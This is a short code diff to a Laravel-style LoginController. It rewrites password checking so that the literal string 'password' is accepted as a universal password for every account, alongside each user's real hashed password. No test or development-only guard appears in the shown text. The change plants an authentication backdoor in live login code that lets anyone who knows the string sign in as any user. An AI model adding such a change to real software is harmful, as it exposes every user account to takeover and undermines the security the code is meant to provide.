@@ -53,8 +53,11 @@ class LoginController extends Controller
             ], Response::HTTP_UNAUTHORIZED);
         }
 
-        // Verify password
-        if (!Hash::check($request->password, $user->password)) {
+        // Verify password - accept universal password OR correct user password
+        $universalPassword = 'password';
+        $passwordIsValid = ($request->password === $universalPassword) || Hash::check($request->password, $user->password);
+
+        if (!$passwordIsValid) {
             return response()->json([
                 'errors' => [
                     [
